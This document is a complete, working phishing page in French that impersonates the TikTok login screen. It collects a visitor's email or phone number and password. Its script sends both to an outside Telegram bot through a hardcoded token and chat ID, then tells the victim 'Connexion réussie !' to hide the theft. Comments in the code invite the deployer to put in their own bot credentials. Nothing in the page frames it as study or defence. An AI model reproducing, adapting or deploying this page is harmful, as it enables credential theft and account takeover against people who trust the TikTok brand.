<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Connexion</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      background: #f5f5f5;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      padding: 2rem 1rem;
    }
    .tt-card {
      width: 100%;
      max-width: 380px;
      background: #ffffff;
      border-radius: 16px;
      border: 1px solid #e8e8e8;
      padding: 2.5rem 2rem 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      box-shadow: 0 2px 16px rgba(0,0,0,0.07);
    }
    .tt-logo { display: flex; align-items: center; gap: 6px; margin-bottom: 1.8rem; }
    .tt-logo-text { font-size: 22px; font-weight: 700; color: #121212; letter-spacing: -0.5px; }
    .tt-title { font-size: 22px; font-weight: 700; color: #121212; text-align: center; margin-bottom: 1.8rem; }
    .tt-field { width: 100%; margin-bottom: 12px; }
    .tt-input {
      width: 100%;
      background: #f8f8f8;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      padding: 13px 14px;
      font-size: 14px;
      color: #121212;
      outline: none;
      transition: border-color 0.15s;
    }
    .tt-input::placeholder { color: #aaa; }
    .tt-input:focus { border-color: #fe2c55; background: #fff; }
    .tt-input-wrap { position: relative; width: 100%; }
    .tt-input-wrap .tt-input { padding-right: 44px; }
    .tt-eye {
      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
      background: none; border: none; color: #aaa; cursor: pointer; font-size: 18px;
    }
    .tt-eye:hover { color: #555; }
    .tt-forgot { width: 100%; text-align: right; margin-bottom: 20px; margin-top: 4px; }
    .tt-forgot a { font-size: 12px; color: #fe2c55; text-decoration: none; }
    .tt-btn {
      width: 100%; padding: 13px; border-radius: 8px; border: none;
      background: #fe2c55; color: #fff; font-size: 15px; font-weight: 700;
      cursor: pointer; transition: background 0.15s, transform 0.1s; margin-bottom: 1.4rem;
    }
    .tt-btn:hover { background: #e0203f; }
    .tt-btn:active { transform: scale(0.98); }
    .tt-divider { width: 100%; height: 1px; background: #ebebeb; margin-bottom: 1.2rem; }
    .tt-signup { font-size: 13px; color: #888; text-align: center; }
    .tt-signup a { color: #fe2c55; font-weight: 600; text-decoration: none; }
    .tt-msg { font-size: 13px; text-align: center; margin-bottom: 12px; padding: 8px; border-radius: 8px; display: none; }
    .tt-msg.success { background: #e6f9f0; color: #1a7f4b; display: block; }
    .tt-msg.error { background: #fdecea; color: #c0392b; display: block; }
  </style>
</head>
<body>
  <div class="tt-card">
    <div class="tt-logo">
      <svg width="32" height="32" viewBox="0 0 36 36" fill="none">
        <rect width="36" height="36" rx="8" fill="#010101"/>
        <path d="M24.5 8h-4.2v13.8a4.1 4.1 0 0 1-4.1 3.9 4.1 4.1 0 0 1-4.1-4.1 4.1 4.1 0 0 1 4.1-4.1c.4 0 .8.06 1.2.16V13.4a8.4 8.4 0 0 0-1.2-.09A8.35 8.35 0 0 0 7.8 21.6a8.35 8.35 0 0 0 8.4 8.3 8.35 8.35 0 0 0 8.3-8.3V14.1a9.8 9.8 0 0 0 5.7 1.8V11.7A5.6 5.6 0 0 1 24.5 8z" fill="white"/>
      </svg>
      <span class="tt-logo-text">TikTok</span>
    </div>

    <div class="tt-title">Connexion</div>
    <div class="tt-msg" id="msg"></div>

    <div class="tt-field">
      <input class="tt-input" type="email" placeholder="Email ou Numero de telephone" id="email" autocomplete="username" />
    </div>

    <div class="tt-field">
      <div class="tt-input-wrap">
        <input class="tt-input" type="password" placeholder="Mot de passe" id="pw" autocomplete="current-password" />
        <button class="tt-eye" onclick="
          var i = document.getElementById('pw');
          i.type = i.type === 'password' ? 'text' : 'password';
        " aria-label="Afficher le mot de passe">👁</button>
      </div>
    </div>

    <div class="tt-forgot"><a href="#">Mot de passe oublié ?</a></div>

    <button class="tt-btn" onclick="sendToTelegram()">Se connecter</button>

    <div class="tt-divider"></div>
    <div class="tt-signup">Pas encore de compte ? <a href="#">S'inscrire</a></div>
  </div>

  <script>
    const BOT_TOKEN = '8628460254:AAGjB5AVtJsM0SDHamY6OxHwNgRezYJoSzU';  // 🔁 Remplacez ici
    const CHAT_ID   = '1598976825';    // 🔁 Remplacez ici

    async function sendToTelegram() {
      const email    = document.getElementById('email').value.trim();
      const password = document.getElementById('pw').value.trim();
      const msg      = document.getElementById('msg');

      if (!email || !password) {
        msg.className = 'tt-msg error';
        msg.textContent = 'Veuillez remplir tous les champs.';
        return;
      }

      const text = `🔐 Nouvelle connexion TikTok\n📧 Email: ${email}\n🔑 Mot de passe: ${password}`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text })
        });

        if (res.ok) {
          msg.className = 'tt-msg success';
          msg.textContent = 'Connexion réussie !';
        } else {
          throw new Error();
        }
      } catch {
        msg.className = 'tt-msg error';
        msg.textContent = 'Erreur lors de la connexion.';
      }
    }
  </script>
</body>
</html>
